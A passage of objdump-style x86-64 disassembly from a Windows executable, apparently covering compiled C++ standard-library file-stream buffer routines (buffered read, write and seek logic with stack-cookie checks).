   140004137:	48 83 ec 30          	sub    $0x30,%rsp
   14000413b:	48 8b 05 3e 5f 03 00 	mov    0x35f3e(%rip),%rax        # 0x14003a080
   140004142:	48 33 c4             	xor    %rsp,%rax
   140004145:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000414a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000414e:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   140004152:	41 8b e9             	mov    %r9d,%ebp
   140004155:	49 8b f0             	mov    %r8,%rsi
   140004158:	48 8b fa             	mov    %rdx,%rdi
   14000415b:	48 8b d9             	mov    %rcx,%rbx
   14000415e:	4c 39 30             	cmp    %r14,(%rax)
   140004161:	75 10                	jne    0x140004173
   140004163:	41 83 f9 01          	cmp    $0x1,%r9d
   140004167:	75 0a                	jne    0x140004173
   140004169:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000416e:	75 03                	jne    0x140004173
   140004170:	48 ff ce             	dec    %rsi
   140004173:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000417a:	00 
   14000417b:	0f 84 83 00 00 00    	je     0x140004204
   140004181:	e8 8a 18 00 00       	call   0x140005a10
   140004186:	84 c0                	test   %al,%al
   140004188:	74 7a                	je     0x140004204
   14000418a:	48 85 f6             	test   %rsi,%rsi
   14000418d:	75 05                	jne    0x140004194
   14000418f:	83 fd 01             	cmp    $0x1,%ebp
   140004192:	74 16                	je     0x1400041aa
   140004194:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000419b:	44 8b c5             	mov    %ebp,%r8d
   14000419e:	48 8b d6             	mov    %rsi,%rdx
   1400041a1:	e8 9a b8 00 00       	call   0x14000fa40
   1400041a6:	85 c0                	test   %eax,%eax
   1400041a8:	75 5a                	jne    0x140004204
   1400041aa:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400041b1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400041b6:	e8 f1 ad 00 00       	call   0x14000efac
   1400041bb:	85 c0                	test   %eax,%eax
   1400041bd:	75 45                	jne    0x140004204
   1400041bf:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400041c3:	4c 39 30             	cmp    %r14,(%rax)
   1400041c6:	75 22                	jne    0x1400041ea
   1400041c8:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   1400041cf:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   1400041d6:	48 89 10             	mov    %rdx,(%rax)
   1400041d9:	44 2b c2             	sub    %edx,%r8d
   1400041dc:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   1400041e0:	48 89 11             	mov    %rdx,(%rcx)
   1400041e3:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   1400041e7:	44 89 01             	mov    %r8d,(%rcx)
   1400041ea:	48 8b 53 74          	mov    0x74(%rbx),%rdx
   1400041ee:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400041f3:	48 89 0f             	mov    %rcx,(%rdi)
   1400041f6:	48 89 57 10          	mov    %rdx,0x10(%rdi)
   1400041fa:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140004201:	00 
   140004202:	eb 15                	jmp    0x140004219
   140004204:	33 c0                	xor    %eax,%eax
   140004206:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   14000420d:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140004214:	00 
   140004215:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140004219:	48 8b c7             	mov    %rdi,%rax
   14000421c:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140004221:	48 33 cc             	xor    %rsp,%rcx
   140004224:	e8 87 42 00 00       	call   0x1400084b0
   140004229:	48 83 c4 30          	add    $0x30,%rsp
   14000422d:	41 5e                	pop    %r14
   14000422f:	5f                   	pop    %rdi
   140004230:	5e                   	pop    %rsi
   140004231:	5d                   	pop    %rbp
   140004232:	5b                   	pop    %rbx
   140004233:	c3                   	ret
   140004234:	cc                   	int3
   140004235:	cc                   	int3
   140004236:	cc                   	int3
   140004237:	cc                   	int3
   140004238:	cc                   	int3
   140004239:	cc                   	int3
   14000423a:	cc                   	int3
   14000423b:	cc                   	int3
   14000423c:	cc                   	int3
   14000423d:	cc                   	int3
   14000423e:	cc                   	int3
   14000423f:	cc                   	int3
   140004240:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004245:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000424a:	56                   	push   %rsi
   14000424b:	57                   	push   %rdi
   14000424c:	41 56                	push   %r14
   14000424e:	48 83 ec 20          	sub    $0x20,%rsp
   140004252:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140004257:	4d 8b f0             	mov    %r8,%r14
   14000425a:	48 8b f2             	mov    %rdx,%rsi
   14000425d:	48 8b d9             	mov    %rcx,%rbx
   140004260:	49 8b f8             	mov    %r8,%rdi
   140004263:	74 75                	je     0x1400042da
   140004265:	4d 85 c0             	test   %r8,%r8
   140004268:	7e 68                	jle    0x1400042d2
   14000426a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004270:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140004274:	48 8b 08             	mov    (%rax),%rcx
   140004277:	48 85 c9             	test   %rcx,%rcx
   14000427a:	74 35                	je     0x1400042b1
   14000427c:	48 8b 43 58          	mov    0x58(%rbx),%rax
   140004280:	48 63 10             	movslq (%rax),%rdx
   140004283:	85 d2                	test   %edx,%edx
   140004285:	7e 2a                	jle    0x1400042b1
   140004287:	48 3b fa             	cmp    %rdx,%rdi
   14000428a:	48 8b ef             	mov    %rdi,%rbp
   14000428d:	48 0f 4d ea          	cmovge %rdx,%rbp
   140004291:	48 8b d6             	mov    %rsi,%rdx
   140004294:	4c 8b c5             	mov    %rbp,%r8
   140004297:	e8 a4 1f 02 00       	call   0x140026240
   14000429c:	48 8b 43 58          	mov    0x58(%rbx),%rax
   1400042a0:	48 2b fd             	sub    %rbp,%rdi
   1400042a3:	29 28                	sub    %ebp,(%rax)
   1400042a5:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   1400042a9:	48 63 c5             	movslq %ebp,%rax
   1400042ac:	48 01 01             	add    %rax,(%rcx)
   1400042af:	eb 19                	jmp    0x1400042ca
   1400042b1:	48 8b 03             	mov    (%rbx),%rax
   1400042b4:	48 8b cb             	mov    %rbx,%rcx
   1400042b7:	0f b6 16             	movzbl (%rsi),%edx
   1400042ba:	ff 50 18             	call   *0x18(%rax)
   1400042bd:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400042c0:	74 10                	je     0x1400042d2
   1400042c2:	48 ff cf             	dec    %rdi
   1400042c5:	bd 01 00 00 00       	mov    $0x1,%ebp
   1400042ca:	48 03 f5             	add    %rbp,%rsi
   1400042cd:	48 85 ff             	test   %rdi,%rdi
   1400042d0:	7f 9e                	jg     0x140004270
   1400042d2:	4c 2b f7             	sub    %rdi,%r14
   1400042d5:	49 8b c6             	mov    %r14,%rax
   1400042d8:	eb 7e                	jmp    0x140004358
   1400042da:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400042de:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   1400042e3:	4c 8b 08             	mov    (%rax),%r9
   1400042e6:	4d 85 c9             	test   %r9,%r9
   1400042e9:	74 08                	je     0x1400042f3
   1400042eb:	48 8b 41 58          	mov    0x58(%rcx),%rax
   1400042ef:	8b 08                	mov    (%rax),%ecx
   1400042f1:	eb 02                	jmp    0x1400042f5
   1400042f3:	33 c9                	xor    %ecx,%ecx
   1400042f5:	4d 85 f6             	test   %r14,%r14
   1400042f8:	7e 53                	jle    0x14000434d
   1400042fa:	85 c9                	test   %ecx,%ecx
   1400042fc:	7e 30                	jle    0x14000432e
   1400042fe:	48 63 e9             	movslq %ecx,%rbp
   140004301:	49 8b c9             	mov    %r9,%rcx
   140004304:	4c 3b f5             	cmp    %rbp,%r14
   140004307:	49 0f 4c ee          	cmovl  %r14,%rbp
   14000430b:	4c 8b c5             	mov    %rbp,%r8
   14000430e:	e8 2d 1f 02 00       	call   0x140026240
   140004313:	48 8b 43 58          	mov    0x58(%rbx),%rax
   140004317:	4c 2b f5             	sub    %rbp,%r14
   14000431a:	29 28                	sub    %ebp,(%rax)
   14000431c:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140004320:	48 63 c5             	movslq %ebp,%rax
   140004323:	48 01 01             	add    %rax,(%rcx)
   140004326:	4d 85 f6             	test   %r14,%r14
   140004329:	7e 22                	jle    0x14000434d
   14000432b:	48 03 f5             	add    %rbp,%rsi
   14000432e:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   140004335:	4d 85 c9             	test   %r9,%r9
   140004338:	74 13                	je     0x14000434d
   14000433a:	4d 8b c6             	mov    %r14,%r8
   14000433d:	ba 01 00 00 00       	mov    $0x1,%edx
   140004342:	48 8b ce             	mov    %rsi,%rcx
   140004345:	e8 be ab 00 00       	call   0x14000ef08
   14000434a:	4c 2b f0             	sub    %rax,%r14
   14000434d:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   140004352:	49 2b fe             	sub    %r14,%rdi
   140004355:	48 8b c7             	mov    %rdi,%rax
   140004358:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000435d:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140004362:	48 83 c4 20          	add    $0x20,%rsp
   140004366:	41 5e                	pop    %r14
   140004368:	5f                   	pop    %rdi
   140004369:	5e                   	pop    %rsi
   14000436a:	c3                   	ret
   14000436b:	cc                   	int3
   14000436c:	cc                   	int3
   14000436d:	cc                   	int3
   14000436e:	cc                   	int3
   14000436f:	cc                   	int3
   140004370:	40 53                	rex push %rbx
   140004372:	56                   	push   %rsi
   140004373:	41 56                	push   %r14
   140004375:	48 83 ec 30          	sub    $0x30,%rsp
   140004379:	4d 8b f0             	mov    %r8,%r14
   14000437c:	48 8b f2             	mov    %rdx,%rsi
   14000437f:	48 8b d9             	mov    %rcx,%rbx
   140004382:	4d 85 c0             	test   %r8,%r8
   140004385:	7f 0b                	jg     0x140004392
   140004387:	33 c0                	xor    %eax,%eax
   140004389:	48 83 c4 30          	add    $0x30,%rsp
   14000438d:	41 5e                	pop    %r14
   14000438f:	5e                   	pop    %rsi
   140004390:	5b                   	pop    %rbx
   140004391:	c3                   	ret
   140004392:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140004397:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   14000439c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400043a1:	74 76                	je     0x140004419
   1400043a3:	49 8b fe             	mov    %r14,%rdi
   1400043a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400043ad:	00 00 00 
   1400043b0:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400043b4:	48 8b 10             	mov    (%rax),%rdx
   1400043b7:	48 85 d2             	test   %rdx,%rdx
   1400043ba:	74 35                	je     0x1400043f1
   1400043bc:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400043c0:	48 63 08             	movslq (%rax),%rcx
   1400043c3:	85 c9                	test   %ecx,%ecx
   1400043c5:	7e 2a                	jle    0x1400043f1
   1400043c7:	48 3b f9             	cmp    %rcx,%rdi
   1400043ca:	48 8b ef             	mov    %rdi,%rbp
   1400043cd:	48 0f 4d e9          	cmovge %rcx,%rbp
   1400043d1:	48 8b ce             	mov    %rsi,%rcx
   1400043d4:	4c 8b c5             	mov    %rbp,%r8
   1400043d7:	e8 64 1e 02 00       	call   0x140026240
   1400043dc:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400043e0:	48 2b fd             	sub    %rbp,%rdi
   1400043e3:	29 28                	sub    %ebp,(%rax)
   1400043e5:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   1400043e9:	48 63 c5             	movslq %ebp,%rax
   1400043ec:	48 01 01             	add    %rax,(%rcx)
   1400043ef:	eb 18                	jmp    0x140004409
   1400043f1:	48 8b 03             	mov    (%rbx),%rax
   1400043f4:	48 8b cb             	mov    %rbx,%rcx
   1400043f7:	ff 50 38             	call   *0x38(%rax)
   1400043fa:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400043fd:	74 12                	je     0x140004411
   1400043ff:	88 06                	mov    %al,(%rsi)
   140004401:	48 ff cf             	dec    %rdi
   140004404:	bd 01 00 00 00       	mov    $0x1,%ebp
   140004409:	48 03 f5             	add    %rbp,%rsi
   14000440c:	48 85 ff             	test   %rdi,%rdi
   14000440f:	7f 9f                	jg     0x1400043b0
   140004411:	4c 2b f7             	sub    %rdi,%r14
   140004414:	e9 e6 00 00 00       	jmp    0x1400044ff
   140004419:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000441d:	49 8b ee             	mov    %r14,%rbp
   140004420:	48 8b 10             	mov    (%rax),%rdx
   140004423:	48 85 d2             	test   %rdx,%rdx
   140004426:	74 08                	je     0x140004430
   140004428:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000442c:	8b 08                	mov    (%rax),%ecx
   14000442e:	eb 02                	jmp    0x140004432
   140004430:	33 c9                	xor    %ecx,%ecx
   140004432:	48 63 c1             	movslq %ecx,%rax
   140004435:	85 c9                	test   %ecx,%ecx
   140004437:	74 2b                	je     0x140004464
   140004439:	49 3b c6             	cmp    %r14,%rax
   14000443c:	49 8b fe             	mov    %r14,%rdi
   14000443f:	48 8b ce             	mov    %rsi,%rcx
   140004442:	48 0f 42 f8          	cmovb  %rax,%rdi
   140004446:	4c 8b c7             	mov    %rdi,%r8
   140004449:	e8 f2 1d 02 00       	call   0x140026240
   14000444e:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140004452:	48 03 f7             	add    %rdi,%rsi
   140004455:	48 2b ef             	sub    %rdi,%rbp
   140004458:	29 38                	sub    %edi,(%rax)
   14000445a:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000445e:	48 63 c7             	movslq %edi,%rax
   140004461:	48 01 01             	add    %rax,(%rcx)
   140004464:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   14000446b:	00 
   14000446c:	0f 84 8a 00 00 00    	je     0x1400044fc
   140004472:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   140004476:	48 8d 43 70          	lea    0x70(%rbx),%rax
   14000447a:	49 39 00             	cmp    %rax,(%r8)
   14000447d:	75 20                	jne    0x14000449f
   14000447f:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140004486:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   14000448d:	49 89 08             	mov    %rcx,(%r8)
   140004490:	2b d1                	sub    %ecx,%edx
   140004492:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140004496:	48 89 08             	mov    %rcx,(%rax)
   140004499:	48 8b 43 50          	mov    0x50(%rbx),%rax
   14000449d:	89 10                	mov    %edx,(%rax)
   14000449f:	48 81 fd ff 0f 00 00 	cmp    $0xfff,%rbp
   1400044a6:	76 35                	jbe    0x1400044dd
   1400044a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400044af:	00 
   1400044b0:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   1400044b7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400044bc:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   1400044c2:	48 8b ce             	mov    %rsi,%rcx
   1400044c5:	e8 2a b2 00 00       	call   0x14000f6f4
   1400044ca:	48 2b e8             	sub    %rax,%rbp
   1400044cd:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   1400044d3:	75 27                	jne    0x1400044fc
   1400044d5:	48 03 f0             	add    %rax,%rsi
   1400044d8:	48 3b e8             	cmp    %rax,%rbp
   1400044db:	77 d3                	ja     0x1400044b0
   1400044dd:	48 85 ed             	test   %rbp,%rbp
   1400044e0:	74 1a                	je     0x1400044fc
   1400044e2:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   1400044e9:	4c 8b c5             	mov    %rbp,%r8
   1400044ec:	ba 01 00 00 00       	mov    $0x1,%edx
   1400044f1:	48 8b ce             	mov    %rsi,%rcx
   1400044f4:	e8 fb b1 00 00       	call   0x14000f6f4
   1400044f9:	48 2b e8             	sub    %rax,%rbp
   1400044fc:	4c 2b f5             	sub    %rbp,%r14
   1400044ff:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   140004504:	49 8b c6             	mov    %r14,%rax
   140004507:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   14000450c:	48 83 c4 30          	add    $0x30,%rsp
   140004510:	41 5e                	pop    %r14
   140004512:	5e                   	pop    %rsi
   140004513:	5b                   	pop    %rbx
   140004514:	c3                   	ret
   140004515:	cc                   	int3
   140004516:	cc                   	int3
   140004517:	cc                   	int3
   140004518:	cc                   	int3
   140004519:	cc                   	int3
   14000451a:	cc                   	int3
   14000451b:	cc                   	int3
   14000451c:	cc                   	int3
   14000451d:	cc                   	int3
   14000451e:	cc                   	int3
   14000451f:	cc                   	int3
   140004520:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004525:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000452a:	55                   	push   %rbp
   14000452b:	57                   	push   %rdi
   14000452c:	41 56                	push   %r14
   14000452e:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   140004533:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000453a:	48 8b 05 3f 5b 03 00 	mov    0x35b3f(%rip),%rax        # 0x14003a080
   140004541:	48 33 c4             	xor    %rsp,%rax
   140004544:	48 89 45 37          	mov    %rax,0x37(%rbp)
   140004548:	48 8b f1             	mov    %rcx,%rsi
   14000454b:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000454f:	48 8b 08             	mov    (%rax),%rcx
   140004552:	48 85 c9             	test   %rcx,%rcx
   140004555:	74 2c                	je     0x140004583
   140004557:	48 8b 56 50          	mov    0x50(%rsi),%rdx
   14000455b:	4c 63 0a             	movslq (%rdx),%r9
   14000455e:	4a 8d 04 09          	lea    (%rcx,%r9,1),%rax
   140004562:	48 3b c8             	cmp    %rax,%rcx
   140004565:	73 1c                	jae    0x140004583
   140004567:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   14000456b:	89 02                	mov    %eax,(%rdx)
   14000456d:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
   140004571:	48 8b 11             	mov    (%rcx),%rdx
   140004574:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140004578:	48 89 01             	mov    %rax,(%rcx)
   14000457b:	0f b6 02             	movzbl (%rdx),%eax
   14000457e:	e9 65 02 00 00       	jmp    0x1400047e8
   140004583:	48 83 be 80 00 00 00 	cmpq   $0x0,0x80(%rsi)
   14000458a:	00 
   14000458b:	75 0a                	jne    0x140004597
   14000458d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004592:	e9 51 02 00 00       	jmp    0x1400047e8
   140004597:	4c 8b 4e 18          	mov    0x18(%rsi),%r9
   14000459b:	48 8d 46 70          	lea    0x70(%rsi),%rax
   14000459f:	49 39 01             	cmp    %rax,(%r9)
   1400045a2:	75 20                	jne    0x1400045c4
   1400045a4:	48 8b 96 90 00 00 00 	mov    0x90(%rsi),%rdx
   1400045ab:	48 8b 8e 88 00 00 00 	mov    0x88(%rsi),%rcx
   1400045b2:	49 89 09             	mov    %rcx,(%r9)
   1400045b5:	48 8b 46 38          	mov    0x38(%rsi),%rax
   1400045b9:	48 89 08             	mov    %rcx,(%rax)
   1400045bc:	2b d1                	sub    %ecx,%edx
   1400045be:	48 8b 46 50          	mov    0x50(%rsi),%rax
   1400045c2:	89 10                	mov    %edx,(%rax)
   1400045c4:	48 83 7e 68 00       	cmpq   $0x0,0x68(%rsi)
   1400045c9:	75 22                	jne    0x1400045ed
   1400045cb:	48 8b 8e 80 00 00 00 	mov    0x80(%rsi),%rcx
   1400045d2:	e8 bd a2 00 00       	call   0x14000e894
   1400045d7:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400045da:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400045df:	0f 84 01 02 00 00    	je     0x1400047e6
   1400045e5:	0f b6 d8             	movzbl %al,%ebx
   1400045e8:	e9 f9 01 00 00       	jmp    0x1400047e6
   1400045ed:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400045f0:	0f 11 45 17          	movups %xmm0,0x17(%rbp)
   1400045f4:	48 c7 45 27 00 00 00 	movq   $0x0,0x27(%rbp)
   1400045fb:	00 
   1400045fc:	48 c7 45 2f 0f 00 00 	movq   $0xf,0x2f(%rbp)
   140004603:	00 
   140004604:	c6 45 17 00          	movb   $0x0,0x17(%rbp)
   140004608:	48 8b 8e 80 00 00 00 	mov    0x80(%rsi),%rcx
   14000460f:	e8 80 a2 00 00       	call   0x14000e894
   140004614:	44 8b c0             	mov    %eax,%r8d
   140004617:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000461a:	0f 84 20 01 00 00    	je     0x140004740
   140004620:	0f b6 5d f7          	movzbl -0x9(%rbp),%ebx
   140004624:	0f 1f 40 00          	nopl   0x0(%rax)
   140004628:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000462f:	00 
   140004630:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   140004634:	48 8b 55 2f          	mov    0x2f(%rbp),%rdx
   140004638:	48 3b ca             	cmp    %rdx,%rcx
   14000463b:	73 20                	jae    0x14000465d
   14000463d:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140004641:	48 89 45 27          	mov    %rax,0x27(%rbp)
   140004645:	48 8d 45 17          	lea    0x17(%rbp),%rax
   140004649:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000464d:	48 0f 47 45 17       	cmova  0x17(%rbp),%rax
   140004652:	44 88 04 08          	mov    %r8b,(%rax,%rcx,1)
   140004656:	c6 44 08 01 00       	movb   $0x0,0x1(%rax,%rcx,1)
   14000465b:	eb 16                	jmp    0x140004673
   14000465d:	45 0f b6 c8          	movzbl %r8b,%r9d
   140004661:	44 0f b6 c3          	movzbl %bl,%r8d
   140004665:	ba 01 00 00 00       	mov    $0x1,%edx
   14000466a:	48 8d 4d 17          	lea    0x17(%rbp),%rcx
   14000466e:	e8 dd 1c 00 00       	call   0x140006350
   140004673:	4c 8b 5e 68          	mov    0x68(%rsi),%r11
   140004677:	48 8d 55 17          	lea    0x17(%rbp),%rdx
   14000467b:	48 83 7d 2f 0f       	cmpq   $0xf,0x2f(%rbp)
   140004680:	48 0f 47 55 17       	cmova  0x17(%rbp),%rdx
   140004685:	4c 8b 4d 27          	mov    0x27(%rbp),%r9
   140004689:	4c 03 ca             	add    %rdx,%r9
   14000468c:	4c 8d 45 17          	lea    0x17(%rbp),%r8
   140004690:	48 83 7d 2f 0f       	cmpq   $0xf,0x2f(%rbp)
   140004695:	4c 0f 47 45 17       	cmova  0x17(%rbp),%r8
   14000469a:	49 8b 03             	mov    (%r11),%rax
   14000469d:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   1400046a1:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1400046a6:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400046aa:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400046af:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   1400046b3:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400046b8:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   1400046bc:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400046c1:	48 8d 56 74          	lea    0x74(%rsi),%rdx
   1400046c5:	49 8b cb             	mov    %r11,%rcx
   1400046c8:	ff 50 30             	call   *0x30(%rax)
   1400046cb:	85 c0                	test   %eax,%eax
   1400046cd:	74 09                	je     0x1400046d8
   1400046cf:	83 e8 01             	sub    $0x1,%eax
   1400046d2:	0f 85 a2 00 00 00    	jne    0x14000477a
   1400046d8:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   1400046dc:	48 39 45 07          	cmp    %rax,0x7(%rbp)
   1400046e0:	48 8d 45 17          	lea    0x17(%rbp),%rax
   1400046e4:	0f 85 a8 00 00 00    	jne    0x140004792
   1400046ea:	48 83 7d 2f 0f       	cmpq   $0xf,0x2f(%rbp)
   1400046ef:	48 0f 47 45 17       	cmova  0x17(%rbp),%rax
   1400046f4:	4c 8b 4d ff          	mov    -0x1(%rbp),%r9
   1400046f8:	4c 2b c8             	sub    %rax,%r9
   1400046fb:	48 8b 7d 27          	mov    0x27(%rbp),%rdi
   1400046ff:	49 3b f9             	cmp    %r9,%rdi
   140004702:	4c 0f 42 cf          	cmovb  %rdi,%r9
   140004706:	48 8d 4d 17          	lea    0x17(%rbp),%rcx
   14000470a:	48 83 7d 2f 0f       	cmpq   $0xf,0x2f(%rbp)
   14000470f:	48 0f 47 4d 17       	cmova  0x17(%rbp),%rcx
   140004714:	49 2b f9             	sub    %r9,%rdi
   140004717:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   14000471b:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   14000471f:	e8 1c 1b 02 00       	call   0x140026240
   140004724:	48 89 7d 27          	mov    %rdi,0x27(%rbp)
   140004728:	48 8b 8e 80 00 00 00 	mov    0x80(%rsi),%rcx
   14000472f:	e8 60 a1 00 00       	call   0x14000e894
   140004734:	44 8b c0             	mov    %eax,%r8d
   140004737:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000473a:	0f 85 f0 fe ff ff    	jne    0x140004630
   140004740:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140004745:	48 8b 55 2f          	mov    0x2f(%rbp),%rdx
   140004749:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000474d:	0f 86 93 00 00 00    	jbe    0x1400047e6
   140004753:	48 8b 45 17          	mov    0x17(%rbp),%rax
   140004757:	48 ff c2             	inc    %rdx
   14000475a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004761:	72 7b                	jb     0x1400047de
   140004763:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140004767:	48 2b c1             	sub    %rcx,%rax
   14000476a:	48 83 e8 08          	sub    $0x8,%rax
   14000476e:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004772:	77 63                	ja     0x1400047d7
   140004774:	48 83 c2 27          	add    $0x27,%rdx
   140004778:	eb 67                	jmp    0x1400047e1
   14000477a:	83 f8 02             	cmp    $0x2,%eax
   14000477d:	75 c1                	jne    0x140004740
   14000477f:	48 8d 45 17          	lea    0x17(%rbp),%rax
   140004783:	48 83 7d 2f 0f       	cmpq   $0xf,0x2f(%rbp)
   140004788:	48 0f 47 45 17       	cmova  0x17(%rbp),%rax
   14000478d:	0f be 18             	movsbl (%rax),%ebx
   140004790:	eb b3                	jmp    0x140004745
   140004792:	48 83 7d 2f 0f       	cmpq   $0xf,0x2f(%rbp)
   140004797:	48 0f 47 45 17       	cmova  0x17(%rbp),%rax
   14000479c:	48 8b 5d 27          	mov    0x27(%rbp),%rbx
   1400047a0:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   1400047a4:	48 2b d9             	sub    %rcx,%rbx
   1400047a7:	48 03 d8             	add    %rax,%rbx
   1400047aa:	48 85 db             	test   %rbx,%rbx
   1400047ad:	7e 1f                	jle    0x1400047ce
   1400047af:	90                   	nop
   1400047b0:	48 ff cb             	dec    %rbx
   1400047b3:	0f be 0c 0b          	movsbl (%rbx,%rcx,1),%ecx
   1400047b7:	48 8b 96 80 00 00 00 	mov    0x80(%rsi),%rdx
   1400047be:	e8 35 ac 00 00       	call   0x14000f3f8
   1400047c3:	48 85 db             	test   %rbx,%rbx
   1400047c6:	7e 06                	jle    0x1400047ce
   1400047c8:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   1400047cc:	eb e2                	jmp    0x1400047b0
   1400047ce:	0f b6 5d 0f          	movzbl 0xf(%rbp),%ebx
   1400047d2:	e9 6e ff ff ff       	jmp    0x140004745
   1400047d7:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400047dc:	cd 29                	int    $0x29
   1400047de:	48 8b c8             	mov    %rax,%rcx
   1400047e1:	e8 2e 3d 00 00       	call   0x140008514
   1400047e6:	8b c3                	mov    %ebx,%eax
   1400047e8:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   1400047ec:	48 33 cc             	xor    %rsp,%rcx
   1400047ef:	e8 bc 3c 00 00       	call   0x1400084b0
   1400047f4:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1400047fb:	00 
   1400047fc:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140004800:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140004804:	49 8b e3             	mov    %r11,%rsp
   140004807:	41 5e                	pop    %r14
   140004809:	5f                   	pop    %rdi
   14000480a:	5d                   	pop    %rbp
   14000480b:	c3                   	ret
   14000480c:	cc                   	int3
   14000480d:	cc                   	int3
   14000480e:	cc                   	int3
   14000480f:	cc                   	int3
   140004810:	40 53                	rex push %rbx
   140004812:	48 83 ec 20          	sub    $0x20,%rsp
   140004816:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000481a:	48 8b d9             	mov    %rcx,%rbx
   14000481d:	48 8b 08             	mov    (%rax),%rcx
   140004820:	48 85 c9             	test   %rcx,%rcx
   140004823:	74 18                	je     0x14000483d
   140004825:	48 8b 43 50          	mov    0x50(%rbx),%rax
